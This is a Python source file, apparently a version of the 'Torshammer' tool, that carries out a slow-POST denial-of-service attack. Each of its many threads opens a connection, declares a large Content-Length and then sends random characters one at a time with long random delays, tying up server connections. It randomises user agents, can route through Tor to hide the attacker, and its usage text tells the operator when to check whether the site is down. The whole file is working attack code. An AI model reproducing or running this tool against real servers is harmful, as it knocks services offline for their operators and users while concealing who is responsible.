#!/usr/bin/env python3

import time
import sys
import random
import getopt
import string
import socket
import ssl
from python_socks.sync import Proxy

from urllib.parse import urlparse
from threading import Thread

stop_now = False
live_connections = 0
json_prefix = '{"a":"'
json_postfix = '"}'
connect_timeout=10

def get_useragent_list():
	with open('user-agents.txt') as f:
		return f.read().splitlines()

useragents = get_useragent_list()

class HttpPostThread(Thread):
    def __init__(self, thread_id, target, content_type, tor):
        Thread.__init__(self)
        self.thread_id = thread_id
        self.tor = tor
        self.content_type = content_type
        self.socket = None
        self.running = True
        url = urlparse(target)
        self.host = url.hostname
        self.path = url.path or '/'
        self.port = url.port if url.port else 443 if url.scheme == 'https' else 80
        self._init_socket()

    def _init_socket(self):
        if not self.tor:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.settimeout(connect_timeout)

    def _connect(self):
        self._log(f'Connecting to {self.host}:{self.port}...')
        if self.tor:
            proxy = Proxy.from_url('socks5://127.0.0.1:9150')
            self.socket = proxy.connect(
                dest_host=self.host,
                dest_port=self.port,
                timeout=connect_timeout
            )
        else:
            self.socket.connect((self.host, self.port))
        if self.port == 443:
            self.socket = ssl.create_default_context().wrap_socket(self.socket, server_hostname=self.host)

    def _log(self, msg):
        print(f'[{live_connections} live connections, thread #{self.thread_id}] {msg}')

    def _send_http_post(self):
        dynamic_payload_length = random.randint(5000, 10000)
        total_payload_length = dynamic_payload_length + len(json_prefix) + len(json_postfix) if self.content_type == 'application/json' else dynamic_payload_length
        headers_list = [
            f'POST {self.path} HTTP/1.1',
            f'Host: {self.host}',
            f'User-Agent: {random.choice(useragents)}',
            'Accept: */*',
            f'Content-Type: {self.content_type}',
            f'Content-Length: {total_payload_length}',
            'Connection: keep-alive',
            'Keep-Alive: timeout=900, max=1000',
        ]
        headers = '\r\n'.join(headers_list)
        self.socket.sendall(headers.encode())
        self.socket.sendall(b'\r\n\r\n')
        self._log(f'Sent headers:\n{headers}\n')

        if self.content_type == 'application/json':
            # self._log(f'Sending {json_prefix}')
            self.socket.sendall(json_prefix.encode())
        for i in range(0, dynamic_payload_length):
            if stop_now:
                self.running = False
                break
            p = random.choice(string.ascii_letters + string.digits)
            # self._log(f'Sending: {p} ({i + 1}/{dynamic_payload_length})')
            self.socket.sendall(p.encode())
            time.sleep(random.uniform(0.5, 8))
        if self.content_type == 'application/json':
            # self._log(f'Sending {json_postfix}')
            self.socket.sendall(json_postfix.encode())

        if not stop_now:
            chunk = self.socket.recv(4096)
            self._log(f'Received:\n{chunk.decode()}')

    def run(self):
        global live_connections
        while self.running:
            while self.running:
                try:
                    self._connect()
                    break
                except Exception as e:
                    self._log(f'Error connecting to {self.host}:{self.port}: {e}')
                    if self.running:
                        time.sleep(random.uniform(1, 5))
                        self._init_socket()

            while self.running:
                try:
                    live_connections += 1
                    self._send_http_post()
                except Exception as e:
                    self._log(f'Connection closed, error: {e}')
                    break
                finally:
                    live_connections -= 1
                    self.socket.close()
                    if self.running:
                        time.sleep(random.uniform(1, 5))
                        self._init_socket()

def usage():
    print('./torshammer.py -t <target> [-r <threads> -T -h]')
    print(' -t|--target <URL including protocol, host and path>')
    print(' -c|--content-type <Value of Content-Type header> Defaults to application/x-www-form-urlencoded')
    print(' -r|--threads <Number of threads> Defaults to 256')
    print(' -T|--tor Enable anonymising through tor on 127.0.0.1:9150')
    print(' -h|--help Shows this help\n')
    print('Eg. ./torshammer.py -t http://192.168.1.100/path -r 256\n')

def main(argv):
    try:
        opts, args = getopt.getopt(argv, 'hTt:c:r:', ['help', 'tor', 'target=', 'content-type=', 'threads='])
    except getopt.GetoptError:
        usage()
        sys.exit(-1)

    global stop_now

    target = ''
    content_type = 'application/x-www-form-urlencoded'
    threads = 256
    tor = False

    for o, a in opts:
        if o in ('-h', '--help'):
            usage()
            sys.exit(0)
        if o in ('-T', '--tor'):
            tor = True
        elif o in ('-t', '--target'):
            target = a
        elif o in ('-c', '--content-type'):
            content_type = a
        elif o in ('-r', '--threads'):
            threads = int(a)

    if target == '' or threads <= 0:
        usage()
        sys.exit(-1)

    print('\n* Target: %s' % (target))
    print('* Threads: %d Tor: %s' % (threads, tor))
    print('* Give 20 seconds without tor or 40 with before checking site\n')

    rthreads = []
    for i in range(threads):
        t = HttpPostThread(i, target, content_type, tor)
        rthreads.append(t)
        t.start()

    while len(rthreads) > 0:
        try:
            rthreads = [t.join(1) for t in rthreads if t is not None and t.is_alive()]
        except KeyboardInterrupt:
            print('\nShutting down threads...\n')
            for t in rthreads:
                stop_now = True
                t.running = False

if __name__ == '__main__':
    main(sys.argv[1:])
